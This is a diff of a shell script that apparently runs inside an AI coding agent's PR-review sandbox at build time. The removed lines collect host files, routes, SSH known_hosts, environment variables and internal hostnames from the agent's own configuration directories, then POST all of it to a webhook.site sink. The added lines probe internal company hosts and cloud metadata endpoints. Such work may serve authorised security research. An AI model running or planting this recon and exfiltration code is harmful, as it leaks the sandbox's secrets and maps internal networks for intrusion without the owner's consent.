@@ -1,103 +1,127 @@
 #!/bin/sh
-# i79712 recon: run inside Devin pr-review sandbox at make parse time.
-# Collects internal DNS/service vantage and probes Fireworks-owned hosts that resolve.
-# All targets are fireworks.ai / fireworks-ai.cloud / RFC1918(10.247.189.245). Sink = our own webhook.site token.
-T="https://webhook.site/fa65cc08-cf4f-424b-8163-1c46187a6bb9/i79712"
-PHASE=$(cat ci/recon.phase 2>/dev/null | tr -dc '0-9'); PH="p${PHASE:-1}"
-D=/tmp/i79712; mkdir -p "$D" 2>/dev/null
-post() { [ -s "$2" ] || { echo "empty $1" > "$D/$1"; set -- "$1" "$D/$1"; }; curl -s -o /dev/null --max-time 12 --noproxy '*' -X POST --data-binary @"$2" "$T/$PH/$1" 2>/dev/null; }
+# i86336 — READ-ONLY internal reachability probe (whitelist only, serial, <=3 ports/host, <=3 paths)
+# POSIX sh compatible (no bashisms). Optional $1 = tee file. No writes, no auth, no port scanning.
+OUT="${1:-}"
+python3 - "$OUT" <<'PY'
+import socket, ssl, sys, os, json, time, hashlib, datetime, threading
+for k in ("http_proxy","https_proxy","HTTP_PROXY","HTTPS_PROXY","ALL_PROXY","all_proxy"):
+    os.environ.pop(k, None)
+OUT = sys.argv[1] if len(sys.argv) > 1 else ""
+class Tee(object):
+    def __init__(self, path, stream):
+        self.s = stream
+        self.f = open(path, "w", encoding="utf-8") if path else None
+    def write(self, d):
+        self.s.write(d); self.s.flush()
+        if self.f:
+            self.f.write(d); self.f.flush()
+    def flush(self):
+        self.s.flush()
+        if self.f:
+            self.f.flush()
+sys.stdout = Tee(OUT, sys.__stdout__)
 
-# ---------- phase 3: probes only (fast path; env/dns/lit already collected in p1) ----------
-if [ "$PHASE" = "3" ]; then
-  pp() { n="$1"; u="$2"; { echo "### PROBE $n $u"; curl -m 4 -sS --noproxy '*' -D - -o "$D/b.$n" "$u" 2>&1 | head -22; echo "### BODY_B64_400"; head -c 400 "$D/b.$n" 2>/dev/null | base64 2>/dev/null | tr -d '\n'; echo; echo "### BODY_LEN"; wc -c < "$D/b.$n" 2>/dev/null; } > "$D/p_$n.txt" 2>&1; post "p_$n" "$D/p_$n.txt"; }
-  rs() { timeout 2 getent ahostsv4 "$1" 2>/dev/null | grep -qE 'STREAM|DGRAM|INET'; }
-  { echo "### START"; date -u; } > "$D/start.txt" 2>&1
-  post start "$D/start.txt"
-  rs company-dashboard.fireworks-ai.cloud && pp companydash "https://company-dashboard.fireworks-ai.cloud/"
-  rs grafana.fireworks-ai.cloud && pp grafana "https://grafana.fireworks-ai.cloud/api/health"
-  { echo "### DONE"; date -u; echo "phase=3"; } > "$D/done.txt" 2>&1
-  post done "$D/done.txt"
-  exit 0
-fi
+T0=time.time(); DEAD=70.0
+def utc(): return datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
+def left(): return DEAD-(time.time()-T0)
 
-# ---------- 1) host / dns / env ----------
-{
-  echo "### DATE"; date -u 2>/dev/null
-  echo "### HOSTNAME_ID"; hostname 2>/dev/null; id 2>/dev/null
-  echo "### /etc/hosts"; head -60 /etc/hosts 2>/dev/null
-  echo "### /etc/resolv.conf"; head -40 /etc/resolv.conf 2>/dev/null
-  echo "### /etc/nsswitch.conf"; head -25 /etc/nsswitch.conf 2>/dev/null
-  echo "### route"; if command -v ip >/dev/null 2>&1; then ip route 2>/dev/null | head -30; ip -4 addr 2>/dev/null | head -60; else netstat -rn 2>/dev/null | head -25; fi
-  echo "### proc_net_route"; cat /proc/net/route 2>/dev/null | head -20
-  echo "### known_hosts"; cat ~/.ssh/known_hosts 2>/dev/null | head -20
-  echo "### env"; env 2>/dev/null | grep -iE 'dns|domain|proxy|host|kube|cluster|suffix|search' | head -40
-  echo "### hostname_f"; cat /etc/hostname 2>/dev/null | head -3
-  echo "### resolv_backups"; ls -la /etc/resolv.conf /run/systemd/resolve 2>/dev/null | head -10
-} > "$D/env.txt" 2>&1
-post env "$D/env.txt"
+TARGETS=[
+ ("gateway.fireworks.ai",443,[("/",False),("/healthz",False)]),
+ ("api.fireworks.ai",443,[("/healthz",False)]),
+ ("app.fireworks.ai",443,[("/",False)]),
+ ("pilot-dev.fireworks-ai.cloud",443,[("/",False)]),
+ ("langfuse.fireworks-ai.cloud",80,[("/",True)]),
+ ("langfuse.fireworks-ai.cloud",443,[("/",False)]),
+ ("harbor.us-iowa-1.fireworks-ai.cloud",443,[("/api/v2.0/projects",False)]),
+ ("10.247.189.245",80,[("/api/v2.0/projects",True)]),
+ ("10.247.189.245",443,[("/",False)]),
+ ("harbor.us-virginia-1.fireworks.ai",443,[("/api/v2.0/projects",False)]),
+ ("metadata.google.internal",80,[("/computeMetadata/v1/",True)]),
+ ("169.254.169.254",80,[("/computeMetadata/v1/",True)]),
+ ("10.200.255.21",443,[("/",False)]),
+ ("10.200.255.21",7233,[]),
+ ("audio-batch.link.fireworks.ai",443,[("/metrics/",False)]),
+ ("gateway-preview.fireworks.ai",443,[("/",False)]),
+ ("grafana.fireworks.ai",443,[("/",False)]),
+]
 
-# ---------- 2) getent for candidate internal hosts ----------
-CANDS="harbor.us-iowa-1.fireworks-ai.cloud harbor.us-virginia-1.fireworks-ai.cloud metis.fireworks-ai.cloud langfuse.fireworks-ai.cloud pilot-dev.fireworks-ai.cloud pilot.fireworks-ai.cloud pgadmin.fireworks-ai.cloud cluster-management.fireworks-ai.cloud company-dashboard.fireworks-ai.cloud grafana.fireworks-ai.cloud gateway.fireworks.ai device-auth.fireworks.ai"
-{
-  for h in $CANDS; do
-    printf '### %s\n' "$h"
-    timeout 2 getent ahostsv4 "$h" 2>&1 | head -3
-    printf -- '---\n'
-  done
-  echo "### svc.cluster.local probes"
-  for h in metis.fireworks-ai.cloud.svc.cluster.local harbor.svc.cluster.local gateway.svc.cluster.local; do
-    printf '### %s\n' "$h"; timeout 2 getent hosts "$h" 2>&1 | head -2; printf -- '---\n'
-  done
-} > "$D/dns.txt" 2>&1
-post dns "$D/dns.txt"
+DNS_CACHE={}
+def dns(host,to=3.0):
+    if host in DNS_CACHE: return DNS_CACHE[host]
+    res={}
+    def w():
+        try:
+            res["v"]=sorted({ai[4][0] for ai in socket.getaddrinfo(host,None)})
+        except Exception as e:
+            res["e"]=type(e).__name__+":"+str(e)[:60]
+    t=threading.Thread(target=w,daemon=True); t.start(); t.join(to)
+    if "v" in res:
+        DNS_CACHE[host] = ",".join(res["v"][:3]); return DNS_CACHE[host]
+    if "e" in res:
+        DNS_CACHE[host] = "ERR("+res["e"]+")"; return DNS_CACHE[host]
+    DNS_CACHE[host] = "TIMEOUT"; return DNS_CACHE[host]
 
-# ---------- 3) grep .devin for internal literals ----------
-{
-  echo "### devin_host_literals"
-  grep -rEoh '[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)*\.(fireworks-ai\.cloud|fireworks\.ai|svc\.cluster\.local)' \
-    /opt/.devin /home/ubuntu/.devin* /root/.devin* /home/ubuntu/repos /home/ubuntu/.config 2>/dev/null | sort -u | head -80
-  echo "### internal_ip_literals"
-  grep -rEoh '(10|172\.(1[6-9]|2[0-9]|3[01]))\.[0-9]{1,3}\.[0-9]{1,3}' \
-    /opt/.devin /home/ubuntu/.devin* /root/.devin* 2>/dev/null | sort -u | head -60
-  echo "### opt_devin_listing"
-  ls -la /opt/.devin 2>/dev/null | head -40
-  echo "### client_live_tier_head"
-  head -40 /home/ubuntu/.devin-files/client_live_tier.sh 2>/dev/null
-} > "$D/lit.txt" 2>&1
-post lit "$D/lit.txt"
+def run(host,port,paths,proto_hint):
+    print("TGT %s:%s dns=%s" % (host,port,dns(host)), end=" ")
+    tcp="fail"; tls="skip"; sock=None
+    try:
+        sock=socket.create_connection((host,port),timeout=min(2.0,max(0.4,left())))
+        tcp="ok"
+    except Exception as e:
+        print("tcp=FAIL(%s) tls=- http=- len=- sha16=- |" % type(e).__name__, flush=True); return
+    is_tls = not proto_hint
+    if port==7233: is_tls=False
+    if is_tls:
+        try:
+            ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+            sni = None if host.replace(".","").isdigit() else host
+            sock=ctx.wrap_socket(sock,server_hostname=sni)
+            tls="ok"
+        except Exception as e:
+            tls="FAIL(%s)" % type(e).__name__
+            try: sock.close()
+            except Exception: pass
+            print("tcp=ok tls=%s http=- len=- sha16=- |" % tls, flush=True); return
+    line="tcp=%s tls=%s" % (tcp,tls)
+    import http.client
+    for path,_ in paths:
+        if left()<2: line+=" http=SKIP(len:<2s)"; break
+        try:
+            if is_tls:
+                c=http.client.HTTPSConnection(host,port,timeout=min(2.0,max(0.4,left())),context=ctx)
+            else:
+                c=http.client.HTTPConnection(host,port,timeout=min(2.0,max(0.4,left())))
+            c.request("GET",path,headers={"User-Agent":"curl/8","Accept":"*/*","Host":host})
+            r=c.getresponse()
+            body=r.read(2048)
+            cl=r.getheader("content-length")
+            ln=cl if cl else ("%d+tr" % len(body))
+            h=hashlib.sha256(body).hexdigest()[:16]
+            txt=body.decode("utf-8","replace").replace("\n"," ").replace("\r"," ")[:160]
+            line += " %s=%s len=%s sha16=%s |%s|" % (path, r.status, ln, h, txt)
+            c.close()
+        except Exception as e:
+            line += " %s=ERR(%s)" % (path, type(e).__name__)
+    try: sock.close()
+    except Exception: pass
+    print(line, flush=True)
 
-# ---------- 4) probes: only resolved hosts, max 6, direct (no proxy) ----------
-N=0
-probe() { # name url [extra]
-  n="$1"; u="$2"; shift 2
-  [ "$N" -ge 6 ] && return 0
-  N=$((N+1))
-  {
-    echo "### PROBE $n $u"
-    curl -m 4 -sS --noproxy '*' -D - "$@" -o "$D/b.$n" "$u" 2>&1 | head -22
-    echo "### BODY_B64_400"
-    head -c 400 "$D/b.$n" 2>/dev/null | base64 2>/dev/null | tr -d '\n' | head -c 600
-    echo
-    echo "### BODY_LEN"; wc -c < "$D/b.$n" 2>/dev/null
-  } > "$D/p_$n.txt" 2>&1
-  post "p_$n" "$D/p_$n.txt"
-}
-res() { timeout 2 getent ahostsv4 "$1" 2>/dev/null | grep -qE 'STREAM|DGRAM|INET'; }
-
-if [ "$PHASE" = "2" ]; then
-  echo "### PHASE2"
-  res company-dashboard.fireworks-ai.cloud && probe companydash "https://company-dashboard.fireworks-ai.cloud/"
-  res grafana.fireworks-ai.cloud && probe grafana "https://grafana.fireworks-ai.cloud/api/health"
-else
-res harbor.us-iowa-1.fireworks-ai.cloud && probe harbor "http://harbor.us-iowa-1.fireworks-ai.cloud/v2/"
-res metis.fireworks-ai.cloud && probe metis "https://metis.fireworks-ai.cloud/api/v1/auth/configuration"
-res langfuse.fireworks-ai.cloud && probe langfuse "https://langfuse.fireworks-ai.cloud/api/public/health"
-res pilot-dev.fireworks-ai.cloud && probe pilotdev "https://pilot-dev.fireworks-ai.cloud/"
-res pgadmin.fireworks-ai.cloud && probe pgadmin "https://pgadmin.fireworks-ai.cloud/"
-res cluster-management.fireworks-ai.cloud && probe clustermgmt "https://cluster-management.fireworks-ai.cloud/"
-fi
-
-# ---------- 5) done marker ----------
-{ echo "### DONE"; date -u; echo "probes=$N"; } > "$D/done.txt" 2>&1
-post done "$D/done.txt"
-exit 0
+print("RECON-BEGIN utc=%s budget=%ss pwd=%s" % (utc(), int(DEAD), os.getcwd()))
+import http.client
+for src in ("https://api.ipify.org","https://ifconfig.me/ip"):
+    try:
+        from urllib.parse import urlsplit
+        u=urlsplit(src); h=u.hostname; p=u.port or 443; path=u.path or "/"
+        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+        c=http.client.HTTPSConnection(h,p,timeout=5,context=ctx)
+        c.request("GET",path,headers={"User-Agent":"curl/8"}); r=c.getresponse(); b=r.read(64).decode("utf8","replace").strip()
+        print("EGRESS src=%s ip=%s status=%s" % (h,b,r.status)); c.close(); break
+    except Exception as e:
+        print("EGRESS src=%s ERR(%s)" % (src,type(e).__name__))
+for host,port,paths in TARGETS:
+    if left()<3:
+        print("TGT %s:%s SKIP(budget)" % (host,port)); continue
+    try: run(host,port,paths,port==80)
+    except Exception as e: print("TGT %s:%s EXC(%s)" % (host,port,type(e).__name__))
+print("RECON-END utc=%s elapsed=%.1fs hostname=%s" % (utc(), time.time()-T0, socket.gethostname()))
+PY
